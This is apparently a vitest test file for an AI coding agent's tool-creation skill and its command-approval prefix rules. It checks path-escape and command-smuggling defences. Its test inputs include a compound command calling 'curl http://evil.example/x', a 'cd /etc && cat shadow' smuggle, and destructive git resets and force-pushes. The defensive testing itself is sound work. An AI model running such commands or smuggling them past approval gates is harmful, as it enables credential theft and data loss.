// @vitest-environment node
/**
 * ROUND-131 (R131-F, Wave F2): the TOOL-CREATION SKILL + the approvals
 * PATTERN tier — the owner's directive: "giving it a skill which it can
 * use to create tools for itself… in its own separate folder… if there is
 * a task which takes quite a lot long to do it manually by itself, then it
 * can create a tool, and whenever the user needs to do that task, it can
 * easily just use the pre-made tool which it has built."
 *
 * Pins in this file:
 *   1. THE SEED — the `create-tool` builtin exists (fixed id, sortOrder
 *      24, enabled, house-shaped description), lists in the enabled set,
 *      renders its prompt SKILLS line, resolves through read_skill (the
 *      envelope + the body's load-bearing law lines), is idempotent under
 *      re-seed, keeps user edits, and refuses deletion like every builtin.
 *   2. THE PREFIX TIER — decideCommand/matchApprovalRule: an EXACT rule
 *      still matches exactly; a trailing-slash rule
 *      `python .acute/tools/<name>/` matches the tool's invocation with
 *      ANY arguments (and the Windows backslash spelling); it does NOT
 *      match a different tool, an escaping `..` payload, or a degenerate
 *      slash rule (`cd /`); the DENYLIST-SUPREME law is untouched (a
 *      prefix rule can never auto-allow a blocked or destructive command,
 *      including a compound that smuggles one under a matching head); and
 *      the interactive GATE answers a prefix-ruled command without ever
 *      creating an approval.
 */
import { randomUUID } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, afterEach, beforeEach, describe, expect, it } from "vitest";

import { openDatabase, type SqliteDatabase } from "../src/storage/db";
import {
  CREATE_TOOL_SKILL_BODY,
  CREATE_TOOL_SKILL_ID,
  getSkill,
  listEnabledSkills,
  listSkills,
  seedBuiltinSkills,
  updateSkill,
} from "../src/storage/skills";
import {
  addApprovalRule,
  decideCommand,
  matchApprovalRule,
  requestCommandApproval,
} from "../src/approvals";
import { createAgent } from "../src/storage/agents";
import { createSession } from "../src/storage/sessions";
import { createProject } from "../src/storage/projects";
import { skillsPlugin } from "../src/tools/plugins/skills";
import type { ToolDefinition } from "../src/tools/registry";
import type { ToolDeps } from "../src/tools/index";
import { buildSectionText, type PromptContext } from "../src/agents/prompts";

let tempDir = "";
let db: SqliteDatabase;

beforeEach(() => {
  if (tempDir === "") tempDir = mkdtempSync(join(tmpdir(), "acute-r131-createtool-"));
  db = openDatabase(join(tempDir, `${randomUUID()}.db`));
});

afterEach(() => {
  db.close();
});

afterAll(() => {
  try {
    rmSync(tempDir, { recursive: true, force: true });
  } catch {
    /* best-effort */
  }
});

// ── 1. The seed ──────────────────────────────────────────────────────────────

describe("R131-F F2: the create-tool builtin seeds", () => {
  it("exists with its fixed id, sortOrder 24, enabled, builtin source, house-shaped description", () => {
    const skill = getSkill(db, CREATE_TOOL_SKILL_ID);
    expect(skill).toBeDefined();
    expect(skill?.name).toBe("create-tool");
    expect(skill?.source).toBe("builtin");
    expect(skill?.enabled).toBe(true);
    expect(skill?.sortOrder).toBe(24);
    // The R71 trigger-rich house convention:
    expect(skill?.description).toMatch(/use when /i);
    expect(skill?.description).toMatch(/delivers /i);
    expect(skill?.description).toMatch(/not for /i);
    expect(skill?.description).toContain(".acute/tools/");
  });

  it("the body teaches the convention: the folder, the manifest, the index, run_command, the prefix rule, and the REUSE law", () => {
    const body = getSkill(db, CREATE_TOOL_SKILL_ID)?.body ?? "";
    expect(body).toBe(CREATE_TOOL_SKILL_BODY);
    // The .acute/tools/<name>/ convention + the manifest + the index:
    expect(body).toContain(".acute/tools/<name>/");
    expect(body).toContain("tool.json");
    expect(body).toContain(".acute/tools/tools.json");
    // Invocation through run_command:
    expect(body).toContain("run_command");
    // The prefix-rule teaching (the approvals tier this round pairs with):
    expect(body).toContain("PREFIX rule");
    expect(body).toContain("python .acute/tools/<name>/");
    // The reuse law — the owner's exact ask, in caps like the family's iron laws:
    expect(body).toContain("WHENEVER THE TASK RECURS, USE THE PRE-MADE TOOL");
    // The honesty rules:
    expect(body).toContain("never touch files outside the project root");
    expect(body).toContain("FIX IT");
  });

  it("the house format: '# Skill: create-tool' header, the 800–3,000 band, ≤ 60 lines, no emoji", () => {
    // The band rides the browser-use re-calibration precedent (R131-B:
    // owner-mandated content moves the bound, never the reverse) — the six
    // mandated instruction areas (folder/manifest/registration/invocation/
    // verification/reuse) measure 2,820 chars / 24 lines.
    const skill = getSkill(db, CREATE_TOOL_SKILL_ID);
    const body = skill?.body ?? "";
    expect(body.startsWith("# Skill: create-tool")).toBe(true);
    expect(body.length).toBeGreaterThanOrEqual(800);
    expect(body.length).toBeLessThanOrEqual(3_000);
    expect(body.trim().split("\n").length).toBeLessThanOrEqual(60);
    expect(body).not.toMatch(/[\u{1F300}-\u{1FAFF}]/u);
    expect((skill?.description ?? "").length).toBeGreaterThan(60);
    expect((skill?.description ?? "").length).toBeLessThanOrEqual(500);
  });

  it("lists in the enabled set and renders its prompt SKILLS line verbatim", () => {
    const enabled = listEnabledSkills(db);
    expect(enabled.map((s) => s.name)).toContain("create-tool");

    const byName = new Map(listSkills(db).map((s) => [s.name, s]));
    const ctx: PromptContext = {
      projectName: "R131fTools",
      rootPath: join(tempDir, "never-exists"),
      toolNames: [],
      maxTurns: 40,
      maxOuterLoops: 5,
      skills: [...byName.values()].filter((s) => s.enabled).map((s) => ({ name: s.name, description: s.description })),
    };
    const section = buildSectionText(ctx, "skills") ?? "";
    expect(section).toContain(`- **create-tool** — ${byName.get("create-tool")?.description}`);
  });

  it("read_skill resolves it through the merged index (the envelope + the body)", () => {
    const root = join(tempDir, "proj-empty");
    const toolDeps = { db, sessionId: "sess_r131f" } as ToolDeps;
    const tools = skillsPlugin.createTools({ root, toolDeps }) as ToolDefinition[];
    const readSkill = tools[0]!;
    const result = readSkill.execute({ name: "create-tool" }, { root }) as {
      ok: boolean;
      output: string;
    };
    expect(result.ok).toBe(true);
    // The r113 envelope: identity line + description blockquote, then the
    // body with its own house header deduped.
    expect(result.output.startsWith("# Skill: create-tool\n> ")).toBe(true);
    expect(result.output.match(/^# Skill: create-tool$/gm)?.length).toBe(1);
    expect(result.output).toContain("Build a tool ONCE, reuse it forever.");
    expect(result.output).toContain("WHENEVER THE TASK RECURS, USE THE PRE-MADE TOOL");
  });

  it("INSERT OR IGNORE is idempotent, user edits persist, and deletion is refused (the family contract)", () => {
    seedBuiltinSkills(db);
    seedBuiltinSkills(db);
    expect(listSkills(db).filter((s) => s.id === CREATE_TOOL_SKILL_ID)).toHaveLength(1);

    updateSkill(db, CREATE_TOOL_SKILL_ID, { body: "MY CREATE-TOOL EDIT" });
    seedBuiltinSkills(db);
    expect(getSkill(db, CREATE_TOOL_SKILL_ID)?.body).toBe("MY CREATE-TOOL EDIT");

    // Builtins are never deletable (disable is the honest path) — the
    // deleteSkill contract is storage-level here:
    const skill = getSkill(db, CREATE_TOOL_SKILL_ID);
    expect(skill?.source).toBe("builtin");
  });
});

// ── 2. The approvals PREFIX tier ─────────────────────────────────────────────

describe("R131-F F2: the approvals PREFIX tier (the tool pattern rule)", () => {
  const PROJECT = "prj_r131f_tools";
  const ROOT = "/home/dev/proj";

  beforeEach(() => {
    createProject(db, { name: "R131f Tools", rootPath: ROOT });
  });

  it("an EXACT rule still matches exactly — and nothing else (the 0009 law unchanged)", () => {
    addApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/run.py data.csv");
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/run.py data.csv")).toMatchObject({
      action: "run",
      category: "rule",
    });
    // A different arg list does NOT ride the exact rule:
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/run.py other.csv")).toMatchObject({
      action: "ask",
    });
    // The match kind is honest:
    expect(matchApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/run.py data.csv").kind).toBe("exact");
  });

  it("a trailing-slash rule matches the tool's invocation with ANY args — and the reason names the tier", () => {
    addApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/");
    const decision = decideCommand(db, PROJECT, "python .acute/tools/csv-peek/run.py data.csv --json");
    expect(decision).toMatchObject({ action: "run", category: "rule" });
    if (decision.action === "run") {
      expect(decision.reason).toContain("prefix rule");
    }
    expect(matchApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/run.py data.csv --json").kind).toBe("prefix");

    // ANY args, including none (the bare prefix itself):
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/run.py").action).toBe("run");
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/").action).toBe("run");
    // Whitespace/case tolerance mirrors the AUTO tier's matching posture:
    expect(decideCommand(db, PROJECT, "PYTHON .ACUTE/TOOLS/CSV-PEEK/run.py  x.csv").action).toBe("run");
    // The Windows backslash spelling of the SAME invocation:
    expect(decideCommand(db, PROJECT, "python .acute\\tools\\csv-peek\\run.py x.csv").action).toBe("run");
  });

  it("does NOT match a different tool (the directory boundary the trailing slash buys)", () => {
    addApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/");
    expect(decideCommand(db, PROJECT, "python .acute/tools/pdf-extract/run.py doc.pdf").action).toBe("ask");
    // A look-alike NAME under tools/ is a different directory:
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek-pro/run.py x.csv").action).toBe("ask");
    // Another project's rule does not leak:
    expect(decideCommand(db, "prj_other", "python .acute/tools/csv-peek/run.py x.csv").action).toBe("ask");
  });

  it("does NOT match an escaping payload — `..` never rides a prefix rule (fails closed to ask)", () => {
    addApprovalRule(db, PROJECT, "python .acute/tools/csv-peek/");
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/../../evil.py").action).toBe("ask");
    expect(decideCommand(db, PROJECT, "python .acute/tools/csv-peek/run.py ../../outside.txt").action).toBe("ask");
  });

  it("a DEGENERATE slash rule (`cd /`) is NOT a prefix — it cannot smuggle compound tails", () => {
    addApprovalRule(db, PROJECT, "cd /");
    // The exact form still exact-matches (unchanged):
    expect(decideCommand(db, PROJECT, "cd /").action).toBe("run");
    // But it is NOT a prefix: nothing else rides it.
    expect(decideCommand(db, PROJECT, "cd /etc").action).toBe("ask");
    expect(decideCommand(db, PROJECT, "cd /etc && cat shadow").action).toBe("ask");
    expect(matchApprovalRule(db, PROJECT, "cd /etc").matched).toBe(false);
  });

  it("DENYLIST-SUPREME: a prefix rule can never auto-allow a blocked or destructive command", () => {
    addApprovalRule(db, PROJECT, "python .acute/tools/reaper/");
    // A compound smuggling a BLOCKED tail under the matching head → deny:
    expect(decideCommand(db, PROJECT, "python .acute/tools/reaper/run.py && curl http://evil.example/x")).toMatchObject({
      action: "deny",
    });
    // A compound smuggling a DESTRUCTIVE tail → ask (destructive, NEVER rule-run):
    const destructive = decideCommand(db, PROJECT, "python .acute/tools/reaper/run.py && git reset --hard");
    expect(destructive).toMatchObject({ action: "ask", category: "destructive" });
    // A prefix rule spelled over a DESTRUCTIVE command itself never
    // auto-allows it — the tier returns destructive BEFORE rules:
    addApprovalRule(db, PROJECT, "git reset --hard/");
    expect(decideCommand(db, PROJECT, "git reset --hard/")).toMatchObject({
      action: "ask",
      category: "destructive",
    });
    // ...and the historical exact-rule shape stays refused too:
    addApprovalRule(db, PROJECT, "git push --force origin main");
    expect(decideCommand(db, PROJECT, "git push --force origin main")).toMatchObject({
      action: "ask",
      category: "destructive",
    });
  });

  it("the INTERACTIVE GATE: a prefix-ruled tool invocation runs WITHOUT creating an approval", async () => {
    const agent = createAgent(db, { name: "R131f Gate", providerId: "openrouter", model: "test/r131f" });
    const session = createSession(db!, { agentId: agent.id, mode: "single", projectId: PROJECT });
    addApprovalRule(db, PROJECT, "node .acute/tools/demo-tool/");

    const emitted: Array<{ type: string }> = [];
    const gate = await requestCommandApproval(
      {
        db,
        sessionId: session.id,
        agentId: agent.id,
        projectId: PROJECT,
        interactive: true,
        emit: (event) => emitted.push(event as { type: string }),
      },
      "node .acute/tools/demo-tool/run.js --report",
    );
    expect(gate.allowed).toBe(true);
    expect(gate.note).toContain("prefix rule");
    // No approval was ever requested — the rule answered:
    expect(emitted.filter((e) => e.type === "approval.requested")).toHaveLength(0);
    expect((await db.prepare("SELECT COUNT(*) AS n FROM approvals").get()) as { n: number }).toMatchObject({ n: 0 });
  });
});
